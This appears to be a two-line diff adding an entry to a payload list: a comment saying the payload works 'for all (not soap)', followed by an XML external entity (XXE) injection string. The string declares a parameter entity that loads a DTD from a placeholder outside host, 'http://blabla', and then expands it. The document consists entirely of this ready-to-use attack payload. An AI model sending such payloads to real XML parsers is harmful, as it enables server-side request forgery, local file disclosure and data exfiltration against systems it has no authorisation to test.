@@ -1,0 +1,2 @@
+#note this payload for all (not soap)
+<!DOCTYPE infosec [<!ENTITY % xxe SYSTEM "http://blabla"> %xxe; ]>
